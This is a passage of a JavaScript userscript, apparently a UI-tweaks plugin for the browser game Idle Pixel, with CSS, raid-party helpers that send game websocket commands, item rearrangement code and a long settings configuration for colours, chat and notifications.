				#panel-gathering .gathering-box.condensed br:nth-child(3)
				{
				  display: none;
				}
				#panel-mining.add-arrow-controls itembox {
				  position: relative;
				}
				#panel-mining:not(.add-arrow-controls) itembox .arrow-controls {
				  display: none !important;
				}
				itembox .arrow-controls {
				  position: absolute;
				  top: 0px;
				  right: 2px;
				  height: 100%;
				  padding: 2px;
				  display: flex;
				  flex-direction: column;
				  justify-content: space-around;
				  align-items: center;
				}
				itembox .arrow {
				  border: solid white;
				  border-width: 0 4px 4px 0;
				  display: inline-block;
				  padding: 6px;
				  cursor: pointer;
				  opacity: 0.85;
				}
				itembox .arrow:hover {
				  opacity: 1;
				  border-color: yellow;
				}
				itembox .arrow.up {
				  transform: rotate(-135deg);
				  -webkit-transform: rotate(-135deg);
				  margin-top: 3px;
				}
				itembox .arrow.down {
				  transform: rotate(45deg);
				  -webkit-transform: rotate(45deg);
				  margin-bottom: 3px;
				}
				#menu-bar-sd_watch {
					margin-left: 20px;
				}
				.sd-watch-text {
					padding-left: 20px;
				}
				.game-menu-bar-left-table-btn tr
				{
				  background-color: transparent !important;
				  border:0 !important;
				  font-size:medium;
				}
				.hover-menu-bar-item:hover {
				  background: #256061 !important;
				  border:0 !important;
				  filter:unset;
				  font-size:medium;
				}
				.thin-progress-bar {
				  background:#437b7c !important;
				  border:0 !important;
				  height:unset;
				}
				.thin-progress-bar-inner {
				  background:#88e8ea !important;
				}
				.game-menu-bar-left-table-btn td{
				  padding-left:20px !important;
				  padding:unset;
				  margin:0px;
				  font-size:medium;
				}
				.game-menu-bar-left-table-btn {
				  background-color: transparent !important;
				}
				.left-menu-item {
				  margin-bottom:unset;
				  font-size:medium;
				}
				.left-menu-item > img {
				  margin-left: 20px;
				  margin-right: 20px;
				}
                .raids-option-bar {
                  width: 90px !important;
                  height: 25px !important;
                  margin-right: 5px !important;
                }
                .raids-buttons {
                justify-content: center !important;
                align-items: center !important;
                border-radius: 5px !important;
                }
				`;

                document.head.appendChild(style);
            }
        };
    };

    const uitRaids = function () {
        // Global Constants
        return {
            initElements: function () {
                var optionsContainer = document.createElement('div');
                optionsContainer.id = 'raid-options-container';
                optionsContainer.style.marginBottom = '10px'

                var raidLocationDropdown = document.createElement('select');
                raidLocationDropdown.id = 'raid-location-dropdown';
                raidLocationDropdown.className = 'raids-option-bar';
                var locations = ['Toybox', 'Mansion', 'Easter'];
                locations.forEach(function (location) {
                    var option = document.createElement('option');
                    option.value = location.toLowerCase();
                    option.text = location;
                    raidLocationDropdown.appendChild(option);
                });

                // Create the second dropdown for raid difficulty
                var raidDifficultyDropdown = document.createElement('select');
                raidDifficultyDropdown.id = 'raid-difficulty-dropdown';
                raidDifficultyDropdown.className = 'raids-option-bar';
                var difficulties = ['Practice', 'Medium', 'Hard'];
                difficulties.forEach(function (difficulty) {
                    var option = document.createElement('option');
                    option.value = difficulty.toLowerCase();
                    option.text = difficulty;
                    raidDifficultyDropdown.appendChild(option);
                });

                // Create the third dropdown for Public/Private
                var raidVisibilityDropdown = document.createElement('select');
                raidVisibilityDropdown.id = 'raid-visibility-dropdown';
                raidVisibilityDropdown.className = 'raids-option-bar';
                var visibility = ['Public', 'Private']
                visibility.forEach(function (vis) {
                    var option = document.createElement('option');
                    option.value = vis.toLowerCase();
                    option.text = vis;
                    raidVisibilityDropdown.appendChild(option);
                });

                let advertRaid = document.createElement('button');
                advertRaid.id = 'raids-advert-button';
                advertRaid.innerText = 'Advertise';
                advertRaid.onclick = function () {
                    uitRaids().advertRaid();
                    this.disabled = true;
                    setTimeout(() => {
                        this.disabled = false;
                    }, 3000);
                }
                advertRaid.className = 'button raids-option-bar raids-buttons';
                advertRaid.style.display = 'none';

                let startRaid = document.createElement('button');
                startRaid.id = 'raids-start-button';
                startRaid.innerText = 'Start Raid';
                startRaid.onclick = function () {
                    uitRaids().startRaid();
                    this.disabled = true;
                    setTimeout(() => {
                        this.disabled = false;
                    }, 2000);
                }
                startRaid.className = 'button raids-option-bar raids-buttons';
                startRaid.style.display = 'none';


                // Find the insertion point in the DOM
                var insertionPoint = document.getElementById('raids-create-or-join-team-btns');

                // Insert the dropdowns into the DOM before the specified element
                optionsContainer.appendChild(raidLocationDropdown);
                optionsContainer.appendChild(raidDifficultyDropdown);
                optionsContainer.appendChild(raidVisibilityDropdown);
                optionsContainer.appendChild(advertRaid);
                optionsContainer.appendChild(startRaid);
                insertionPoint.parentNode.insertBefore(optionsContainer, insertionPoint);

                document
                    .getElementById('raids-create-or-join-team-btns')
                    .innerHTML = document.getElementById('raids-create-or-join-team-btns')
                        .innerHTML.replace(""Modals.raid_create_team_button()"", ""uitRaids().createRaid()"");

                const panel = document.getElementById('raids-team-panel');
                panel.innerHTML = panel.innerHTML.replace(/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/g, '<br/>');
            },
            createRaid: function () {
                let locationRaids = document.getElementById('raid-location-dropdown').value;
                let modeRaids = document.getElementById('raid-difficulty-dropdown').value;
                websocket.send(`CREATE_RAID_TEAM=${locationRaids}-${modeRaids}`);
                document.getElementById('raids-start-button').style.display = 'inline-flex';
                document.getElementById('raids-advert-button').style.display = 'inline-flex';
            },
            advertRaid: function () {
                let locationRaids = document.getElementById('raid-location-dropdown').selectedOptions[0].text;
                let modeRaids = document.getElementById('raid-difficulty-dropdown').selectedOptions[0].text;;
                let raidPW = document.getElementById('raids-team-panel-uuid').innerText;
                let users = ['user1', 'user2', 'user3', 'user4'];
                let userCount = 0;
                users.forEach((user) => {
                    if (!document.getElementById(`raids-team-panel-${user}`).innerHTML.includes('(none)')) {
                        userCount++;
                    }
                })
                let neededCount = 4 - userCount;
                if (locationRaids != ""Easter"") {
                    websocket.send(`CHAT=${raidPW} : [${locationRaids}] || [${modeRaids}] || [${neededCount} Open Spots]`);
                } else {
                    websocket.send(`CHAT=${raidPW} : [${locationRaids}] || [Have Certificate] || [${neededCount} Open Spots]`);
                }
                //console.log(`${raidPW} : [${locationRaids}] || [${modeRaids}] || [${neededCount} Open Spots]`)
            },
            startRaid: function () {
                let locationRaids = document.getElementById('raid-location-dropdown').value;
                let modeRaids = document.getElementById('raid-difficulty-dropdown').value;
                let locationMatch = {
                    toybox: 2,
                    mansion: 1,
                    easter: 3,
                };
                let modeMatch = {
                    practice: 0,
                    medium: 1,
                    hard: 2
                };
                let locationValue = locationMatch[locationRaids];
                let modeValue = modeMatch[modeRaids];
                if (locationRaids != ""easter"") {
                    websocket.send(`START_RAID_${locationValue}=${modeValue}`);
                } else {
                    websocket.send(`START_RAID_${locationValue}=1`);
                }
            },
        }
    }

    const uitHoliday = function () {
        window.uitEaster = [
            ""chocolate_scythe"",
            ""chocolate_skeleton_sword"",
            ""chocolate_dagger"",
            ""chocolate_stinger"",
            ""chocolate_fish"",
            ""chocolate_logs"",
            ""chocolate_mushroom"",
            ""chocolate_leaf"",
            ""chocolate_bar"",
            ""chocolate_ore""
        ];
        return {
            easter2024: function () {
                let certificateElement = document.querySelector(""itembox[data-item=chocolate_certificate"");
                if (certificateElement) {
                    certificateElement.setAttribute(""data-item"", ""playtime"");
                    uitEaster.forEach((item) => {
                        let element = document.querySelector(`itembox[data-item=${item}`);
                        element.setAttribute(""data-item"", ""playtime"");
                        certificateElement.insertAdjacentElement(""afterEnd"", element);
                        element.insertAdjacentHTML(""beforebegin"", `\n\n`)
                        let numElem = element.querySelector(`item-display[data-key=${item}`);
                        element.className = ""itembox-fight shadow hover"";
                    });
                    document.getElementById(""panel-keyitems"");
                }
            }
        }
    }

    const uitDustPotions = function() {
        window.dustPots = [
            ""cooks_dust"",
            ""cooks_dust_potion"",
            ""fighting_dust_potion"",
            ""fighting_dust"",
            ""tree_dust"",
            ""tree_dust_potion"",
            ""farm_dust"",
            ""farm_dust_potion"",
        ];
        return {
            cloneDust: function () {
                const brewing = document.getElementById(""panel-brewing"");
                const cooking = document.getElementById(""panel-cooking"").querySelector(""itembox[data-item=maggots]"");
                const fighting = document.getElementById(""game-panels-combat-items-area"").querySelectorAll('div[data-tooltip=""fight""]')[1];
                const woodcut = document.getElementById(""panel-woodcutting"").querySelector(""itembox[data-item=flexible_logs]"");
                const farming = document.getElementById(""panel-farming"").querySelector(""itembox[data-item=bonemeal_bin]"");
                
                dustPots.forEach((item) => {
                    let moveMe = brewing.querySelector(`itembox[data-item=${item}]`).cloneNode(true);
                    if(item.startsWith(""cooks"")) {
                        cooking.insertAdjacentElement(""beforebegin"", moveMe);
                        moveMe.insertAdjacentHTML(""afterend"", `\n\n`);
                    }
                    if(item.startsWith(""fighting"")) {
                        fighting.insertAdjacentElement(""afterend"", moveMe);
                        moveMe.insertAdjacentHTML(""beforebegin"", `\n\n`);
                    }
                    if(item.startsWith(""tree"")) {
                        woodcut.insertAdjacentElement(""beforebegin"", moveMe);
                        moveMe.insertAdjacentHTML(""afterend"", `\n\n`);
                    }
                    if(item.startsWith(""farm"")) {
                        farming.insertAdjacentElement(""beforebegin"", moveMe);
                        moveMe.insertAdjacentHTML(""afterend"", `\n\n`);
                    }
                });

            }
        }
    }

    // End New Base Code Re-work
    // Window Calls for initializing
    window.uitLevel = uitLevel;
    window.uitPurpleKey = uitPurpleKey;
    window.uitCriptoe = uitCriptoe;
    window.uitTableLabels = uitTableLabels;
    window.uitFishing = uitFishing;
    window.uitInvention = uitInvention;
    window.uitRocket = uitRocket;
    window.uitMisc = uitMisc;
    window.uitRaids = uitRaids;
    window.uitHoliday = uitHoliday;

    let onLoginLoaded = false;

    // will be overwritten if data available in IdlePixelPlus.info
    const SMELT_TIMES = {
        copper: 3,
        iron: 6,
        silver: 15,
        gold: 50,
        promethium: 100,
        titanium: 500,
        ancient_ore: 1800,
        dragon_ore: 3600,
    };

    const copperItemBox = document.querySelector(""itembox[data-item=copper] img"");

    const FONTS = [];
    const FONT_DEFAULT = ""IdlePixel Default"";
    const FONT_FAMILY_DEFAULT = 'pixel, ""Courier New"", Courier, monospace';
    (async () => {
        const FONTS_CHECK = new Set(
            [
                // Windows 10
                ""Arial"",
                ""Arial Black"",
                ""Bahnschrift"",
                ""Calibri"",
                ""Cambria"",
                ""Cambria Math"",
                ""Candara"",
                ""Comic Sans MS"",
                ""Consolas"",
                ""Constantia"",
                ""Corbel"",
                ""Courier New"",
                ""Ebrima"",
                ""Franklin Gothic Medium"",
                ""Gabriola"",
                ""Gadugi"",
                ""Georgia"",
                ""HoloLens MDL2 Assets"",
                ""Impact"",
                ""Ink Free"",
                ""Javanese Text"",
                ""Leelawadee UI"",
                ""Lucida Console"",
                ""Lucida Sans Unicode"",
                ""Malgun Gothic"",
                ""Marlett"",
                ""Microsoft Himalaya"",
                ""Microsoft JhengHei"",
                ""Microsoft New Tai Lue"",
                ""Microsoft PhagsPa"",
                ""Microsoft Sans Serif"",
                ""Microsoft Tai Le"",
                ""Microsoft YaHei"",
                ""Microsoft Yi Baiti"",
                ""MingLiU-ExtB"",
                ""Mongolian Baiti"",
                ""MS Gothic"",
                ""MV Boli"",
                ""Myanmar Text"",
                ""Nirmala UI"",
                ""Palatino Linotype"",
                ""Segoe MDL2 Assets"",
                ""Segoe Print"",
                ""Segoe Script"",
                ""Segoe UI"",
                ""Segoe UI Historic"",
                ""Segoe UI Emoji"",
                ""Segoe UI Symbol"",
                ""SimSun"",
                ""Sitka"",
                ""Sylfaen"",
                ""Symbol"",
                ""Tahoma"",
                ""Times New Roman"",
                ""Trebuchet MS"",
                ""Verdana"",
                ""Webdings"",
                ""Wingdings"",
                ""Yu Gothic"",
                // macOS
                ""American Typewriter"",
                ""Andale Mono"",
                ""Arial"",
                ""Arial Black"",
                ""Arial Narrow"",
                ""Arial Rounded MT Bold"",
                ""Arial Unicode MS"",
                ""Avenir"",
                ""Avenir Next"",
                ""Avenir Next Condensed"",
                ""Baskerville"",
                ""Big Caslon"",
                ""Bodoni 72"",
                ""Bodoni 72 Oldstyle"",
                ""Bodoni 72 Smallcaps"",
                ""Bradley Hand"",
                ""Brush Script MT"",
                ""Chalkboard"",
                ""Chalkboard SE"",
                ""Chalkduster"",
                ""Charter"",
                ""Cochin"",
                ""Comic Sans MS"",
                ""Copperplate"",
                ""Courier"",
                ""Courier New"",
                ""Didot"",
                ""DIN Alternate"",
                ""DIN Condensed"",
                ""Futura"",
                ""Geneva"",
                ""Georgia"",
                ""Gill Sans"",
                ""Helvetica"",
                ""Helvetica Neue"",
                ""Herculanum"",
                ""Hoefler Text"",
                ""Impact"",
                ""Lucida Grande"",
                ""Luminari"",
                ""Marker Felt"",
                ""Menlo"",
                ""Microsoft Sans Serif"",
                ""Monaco"",
                ""Noteworthy"",
                ""Optima"",
                ""Palatino"",
                ""Papyrus"",
                ""Phosphate"",
                ""Rockwell"",
                ""Savoye LET"",
                ""SignPainter"",
                ""Skia"",
                ""Snell Roundhand"",
                ""Tahoma"",
                ""Times"",
                ""Times New Roman"",
                ""Trattatello"",
                ""Trebuchet MS"",
                ""Verdana"",
                ""Zapfino"",
                // other
                ""Helvetica"",
                ""Garamond"",
            ].sort()
        );
        await document.fonts.ready;
        for (const font of FONTS_CHECK.values()) {
            if (document.fonts.check(`12px ""${font}""`)) {
                FONTS.push(font);
            }
        }
        FONTS.unshift(""IdlePixel Default"");
    })();

    const BG_COLORS = {
        ""#chat-area .server_message"": """",
        body: ""rgb(200, 247, 248)"",
        "".game-top-bar"": getComputedStyle(document.querySelector("".game-top-bar""))
            .backgroundColor,
        ""#menu-bar"": getComputedStyle(document.querySelector(""#menu-bar""))
            .backgroundColor,
        ""#chat-area"": getComputedStyle(document.querySelector(""#chat-area""))
            .backgroundColor,
        ""#game-chat"": getComputedStyle(document.querySelector(""#game-chat""))
            .backgroundColor,
        ""#panels"": getComputedStyle(document.querySelector(""#panels""))
            .backgroundColor,
    };

    const FONT_COLORS = {
        ""#chat-area .server_message"": """",
        ""#chat-area"": document.querySelector(""#chat-area"")
            ? getComputedStyle(document.querySelector(""#chat-area"")).color
            : """",
        ""#chat-area .color-green"": document.querySelector(""#chat-area .color-green"")
            ? getComputedStyle(document.querySelector(""#chat-area .color-green""))
                .color
            : """",
        ""#chat-area .color-grey"": document.querySelector(""#chat-area .color-grey"")
            ? getComputedStyle(document.querySelector(""#chat-area .color-grey"")).color
            : """",
        ""#chat-area .chat-username"": document.querySelector(
            ""#chat-area .chat-username""
        )
            ? getComputedStyle(document.querySelector(""#chat-area .chat-username""))
                .color
            : """",
        ""#panels"": document.querySelector(""#panels"")
            ? getComputedStyle(document.querySelector(""#panels"")).color
            : """",
        ""#panels .color-grey"": document.querySelector(""#panels .color-grey"")
            ? getComputedStyle(document.querySelector(""#panels .color-grey"")).color
            : """",
        ""#panels .font-large"": document.querySelector(""#panels .font-large"")
            ? getComputedStyle(document.querySelector(""#panels .font-large"")).color
            : """",
        ""#menu-bar-button .color-grey"": document.querySelector(
            ""#panels .color-grey""
        )
            ? getComputedStyle(document.querySelector(""#panels .color-grey"")).color
            : """",
    };

    const CHAT_UPDATE_FILTER = [
        ""#chat-area"",
        ""#chat-area .color-green"",
        ""#chat-area .color-grey"",
        ""#chat-area .chat-username"",
        ""#chat-area .server_message"",
    ];

    const PANEL_UPDATE_FILTER = [""#panels""];

    let condensedLoaded = false;

    class UITweaksPlugin extends IdlePixelPlusPlugin {
        constructor() {
            super(""ui-tweaks"", {
                about: {
                    name: GM_info.script.name + "" (ver: "" + GM_info.script.version + "")"",
                    version: GM_info.script.version,
                    author: GM_info.script.author,
                    description: GM_info.script.description,
                },
                config: [
                    {
                        label:
                            ""------------------------------------------------<br/>Chat/Images<br/>------------------------------------------------"",
                        type: ""label"",
                    },
                    {
                        id: ""font"",
                        label: ""Primary Font"",
                        type: ""select"",
                        options: FONTS,
                        default: FONT_DEFAULT,
                    },
                    {
                        id: ""sideChat"",
                        label: ""Side Chat"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""condensedUI"",
                        label: ""Enable Condensed UI and Left Bar Tweaks"",
                        type: ""boolean"",
                        default: true,
                    },
                    /*{
                        id: ""pinChat"",
                        label: ""Pin Chat on Side (Only works if Side Chat is active. Thanks BanBan)"",
                        type: ""boolean"",
                        default: false
                    },*/
                    {
                        id: ""chatLimit"",
                        label: ""Chat Message Limit (&leq; 0 means no limit)"",
                        type: ""int"",
                        min: -1,
                        max: 5000,
                        default: 0,
                    },
                    {
                        id: ""combatChat"",
                        label: ""Enable Chat to be visible while in combat."",
                        type: ""boolean"",
                        default: true
                    },
                    {
                        id: ""imageTitles"",
                        label: ""Image Mouseover"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""tableLabels"",
                        label:
                            ""Turn on item component labels for crafting/brewing/invention<br/>May require restart to disable"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""lowerToast"",
                        label: ""Lower Toast (top-right popup)"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        label:
                            ""------------------------------------------------<br/>Combat<br/>------------------------------------------------"",
                        type: ""label"",
                    },
                    {
                        id: ""fightPointsStats"",
                        label: ""Fight Points in Left Menu"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""combatInfoSideSelect"",
                        label:
                            ""Choose which side you want to see the<br/>Fight Points / Rare Pot Duration / Loot Pot info on.<br/>Left (Player info) || Right (Enemy Info)"",
                        type: ""select"",
                        default: ""left"",
                        options: [
                            { value: ""left"", label: ""Left - Player Side"" },
                            { value: ""right"", label: ""Right - Enemy Side"" },
                        ],
                    },
                    {
                        label:
                            ""------------------------------------------------<br/>Condensed Information<br/>------------------------------------------------"",
                        type: ""label"",
                    },
                    {
                        id: ""condenseWoodcuttingPatches"",
                        label: ""Condensed Woodcutting Patches"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""condenseFarmingPatches"",
                        label: ""Condensed Farming Patches"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""condenseGatheringBoxes"",
                        label: ""Condensed Gathering Boxes"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        label:
                            ""------------------------------------------------<br/>Fishing<br/>------------------------------------------------"",
                        type: ""label"",
                    },
                    {
                        id: ""heatInFishingTab"",
                        label: ""Heat In Fishing Tab"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""minusOneHeatInFishingTab"",
                        label: ""Heat In Fishing Tab (Minus 1 for collectors)"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""hideAquarium"",
                        label: ""Hide the notification for Aquarium needing to be fed"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""hideBoat"",
                        label: ""Hide the notification for Boats (Timer and Collect)"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        label:
                            ""------------------------------------------------<br/>Invention<br/>------------------------------------------------"",
                        type: ""label"",
                    },
                    {
                        id: ""hideOrbRing"",
                        label: ""Hide crafted glass orbs and master ring in invention"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        label:
                            ""------------------------------------------------<br/>Misc<br/>------------------------------------------------"",
                        type: ""label"",
                    },
                    {
                        id: ""robotReady"",
                        label: ""Show Robot Ready"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""moveSDWatch"",
                        label: ""Move Stardust Watch notifications to left side pannel"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""showHeat"",
                        label: ""Show heat on left side pannel"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""showPurpleKeyNotification"",
                        label: ""Show quick button notification for purple key"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""hideCrystalBall"",
                        label: ""Hide the notification for crystal ball"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""merchantReady"",
                        label: ""Show Merchant Ready notification"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""mixerTimer"",
                        label: ""Show Brewing Mixer timer and charges available"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        label:
                            ""------------------------------------------------<br/>Oil<br/>------------------------------------------------"",
                        type: ""label"",
                    },
                    {
                        id: ""oilSummaryMining"",
                        label: ""Oil Summary, Mining Panel"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""oilSummaryCrafting"",
                        label: ""Oil Summary, Crafting Panel"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""oilFullNotification"",
                        label: ""Oil Full"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""oilGainNotification"",
                        label: ""Oil Gain Timer"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        label:
                            ""------------------------------------------------<br/>Rocket<br/>------------------------------------------------"",
                        type: ""label"",
                    },
                    {
                        id: ""rocketETATimer"",
                        label: ""Rocket Notification ETA"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""leftSideRocketInfoSection"",
                        label:
                            ""Enable moving of rocket information to left side (hides notifications)"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""leftSideRocketInfo"",
                        label:
                            ""Enable Rocket Distance/Travel Time on left side (hides rocket notification)"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""leftSideRocketFuel"",
                        label: ""Enable Rocket Fuel Info on left side."",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""leftSideRocketPot"",
                        label:
                            ""Enable Rocket Pot Info on left side. (hides rocket pot notification)"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""hideRocketKM"",
                        label: ""Rocket Notification Hide KM"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""goodMoon"",
                        label:
                            ""Good moon distance<br/>(Range: 250,000 - 450,000)<br/>Type entire number without ','"",
                        type: ""int"",
                        default: 300000,
                    },
                    {
                        id: ""goodSun"",
                        label:
                            ""Good sun distance<br/>(Range: 100,000,000 - 200,000,000)<br/>Type entire number without ','"",
                        type: ""int"",
                        default: 130000000,
                    },
                    {
                        label:
                            ""------------------------------------------------<br/>Smelting/Mining<br/>------------------------------------------------"",
                        type: ""label"",
                    },
                    {
                        id: ""miningMachineArrows"",
                        label: ""Mining Machine Arrows"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""smeltingNotificationTimer"",
                        label: ""Smelting Notification Timer"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""furnaceEmptyNotification"",
                        label: ""Furnace Empty Notification"",
                        type: ""boolean"",
                        default: true,
                    },
                    {
                        id: ""hideDrillNotifications"",
                        label: ""Hide Active Mining Machine Notifications on top bar"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        label:
                            ""------------------------------------------------<br/>BG Color Overrides<br/>------------------------------------------------"",
                        type: ""label"",
                    },
                    {
                        id: ""disableBGColorOverrides"",
                        label:
                            ""Disable background color overrides (Check = disabled)<br/>Disable the BG Color Overrides if you are wanting to use<br/>the built in settings for the game for your colors<br/>REFRESH REQUIRED WHEN DISABLING THE BG COLORS<br/>"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""color-enabled-body"",
                        label: ""Main Background: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""color-body"",
                        label: ""Main Background: Color"",
                        type: ""color"",
                        default: BG_COLORS[""body""],
                    },
                    {
                        id: ""color-enabled-panels"",
                        label: ""Panel Background: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""color-panels"",
                        label: ""Panel Background: Color"",
                        type: ""color"",
                        default: BG_COLORS[""#panels""],
                    },
                    {
                        id: ""color-enabled-top-bar"",
                        label: ""Top Background: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""color-top-bar"",
                        label: ""Top Background: Color"",
                        type: ""color"",
                        default: BG_COLORS["".game-top-bar""],
                    },
                    {
                        id: ""color-enabled-menu-bar"",
                        label: ""Menu Background: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""color-menu-bar"",
                        label: ""Menu Background: Color"",
                        type: ""color"",
                        default: BG_COLORS[""#menu-bar""],
                    },
                    {
                        id: ""color-enabled-chat-area"",
                        label: ""Inner Chat BG: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""color-chat-area"",
                        label: ""Inner Chat BG: Color"",
                        type: ""color"",
                        default: BG_COLORS[""#chat-area""],
                    },
                    {
                        id: ""color-enabled-game-chat"",
                        label: ""Outer Chat BG: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""color-game-chat"",
                        label: ""Outer Chat BG: Color"",
                        type: ""color"",
                        default: BG_COLORS[""#game-chat""],
                    },
                    {
                        id: ""color-enabled-chat-area-server_message"",
                        label: ""Server Message Tag: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""color-chat-area-server_message"",
                        label: ""Server Message Tag: Color"",
                        type: ""color"",
                        default: BG_COLORS[""#chat-area .server_message""],
                    },
                    {
                        label: ""Text Color Overrides"",
                        type: ""label"",
                    },
                    {
                        id: ""font-color-enabled-chat-area"",
                        label: ""Chat Text: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""font-color-chat-area"",
                        label: ""Chat Text: Color"",
                        type: ""color"",
                        default: FONT_COLORS[""#chat-area""],
                    },
                    {
                        id: ""font-color-enabled-chat-area-color-green"",
                        label: ""Chat Timestamp: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""font-color-chat-area-color-green"",
                        label: ""Chat Timestamp: Color"",
                        type: ""color"",
                        default: FONT_COLORS[""#chat-area .color-green""],
                    },
                    {
                        id: ""font-color-enabled-chat-area-chat-username"",
                        label: ""Chat Username: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""font-color-chat-area-chat-username"",
                        label: ""Chat Username: Color"",
                        type: ""color"",
                        default: FONT_COLORS[""#chat-area .chat-username""],
                    },
                    {
                        id: ""font-color-enabled-chat-area-color-grey"",
                        label: ""Chat Level: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""font-color-chat-area-color-grey"",
                        label: ""Chat Level: Color"",
                        type: ""color"",
                        default: FONT_COLORS[""#chat-area .color-grey""],
                    },



                    {
                        id: ""font-color-chat-area-chat-raid-password"",
                        label: ""Raid Password Link Text: Color"",
                        type: ""color"",
                        default: ""#c5baba"",
                    },
                    {
                        id: ""background-color-chat-area-raid-password"",
                        label: ""Raid Password Link Background: Color"",
                        type: ""color"",
                        default: ""darkred"",
                    },
                    {
                        id: ""font-color-enabled-chat-area-server_message"",
                        label: ""Server Message Tag: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""font-color-chat-area-server_message"",
                        label: ""Server Message Tag: Color"",
                        type: ""color"",
                        default: FONT_COLORS[""#chat-area .server_message""],
                    },
                    {
                        id: ""serverMessageTextOverrideEnabled"",
                        label: ""Server Message Text: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""serverMessageTextOverrideColor"",
                        label: ""Server Message Text: Color"",
                        type: ""color"",
                        default: ""blue"",
                    },
                    {
                        id: ""chatBorderOverrideColorEnabled"",
                        label: ""Chat Border Color: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""chatBorderOverrideColor"",
                        label: ""Chat Border Color: Color"",
                        type: ""color"",
                        default: ""blue"",
                    },
                    {
                        id: ""font-color-enabled-panels"",
                        label: ""Panels 1: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""font-color-panels"",
                        label: ""Panels 1: Color"",
                        type: ""color"",
                        default: FONT_COLORS[""#chat-area""],
                    },
                    {
                        id: ""font-color-enabled-panels-color-grey"",
                        label: ""Panels 2: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""font-color-panels-color-grey"",
                        label: ""Panels 2: Color"",
                        type: ""color"",
                        default: FONT_COLORS[""#chat-area .color-grey""],
                    },
                    {
                        id: ""font-color-enabled-panels-font-large"",
                        label: ""Skill Level Color: Enabled"",
                        type: ""boolean"",
                        default: false,
                    },
                    {
                        id: ""font-color-panels-font-large"",
                        label: ""Skill Level: Color"",
                        type: ""color"",
                        default: FONT_COLORS[""#panels .font-large""],
                    },
                ],
            });
        }

        condensedUI() {
            let leftbar = document.getElementById(""menu-bar-buttons"");

            let styleElement = document.getElementById(""condensed-ui-tweaks"");

            if (styleElement) {
                styleElement.parentNode.removeChild(styleElement);
            }
            document
                .getElementById(""menu-bar-buttons"")
                .querySelectorAll("".font-small"")
                .forEach(function (smallFont) {
                    let classInfo = smallFont.className.replaceAll(
                        ""font-small"",
                        ""font-medium""
                    );
                    smallFont.className = classInfo;
                });

            var spans = document.querySelectorAll(
                ""#menu-bar-cooking-table-btn-wrapper span""
            );

            var cookingSpan = Array.from(spans).find(
                (span) => span.textContent === ""COOKING""
            );

            if (cookingSpan) {
                cookingSpan.className = ""font-medium color-white"";
            }

            leftbar.querySelectorAll(""img"").forEach(function (img) {
                img.className = ""w20"";
            });

            setTimeout(function () {
                document.getElementById(
                    ""market-sidecar""
                ).parentNode.parentNode.style.paddingLeft = ""20px"";
                document.getElementById(
                    ""market-sidecar""
                ).parentNode.parentNode.style.padding = """";
            }, 1000);
            document.getElementById(""left-menu-bar-labels"").style.paddingBottom =
                ""10px !important"";
        }

        defaultUI() {
            var styleElement = document.getElementById(""condensed-ui-tweaks"");

            if (styleElement) {
                styleElement.parentNode.removeChild(styleElement);
            }
        }

        miningMachTimer() {
            const drillNotifications = getThis.getConfig(""hideDrillNotifications"");

            if (drillNotifications) {
                document.getElementById(""notification-drill"").style.display = ""none"";
                document.getElementById(""notification-crusher"").style.display = ""none"";
                document.getElementById(""notification-giant_drill"").style.display = ""none"";
                document.getElementById(""notification-excavator"").style.display = ""none"";
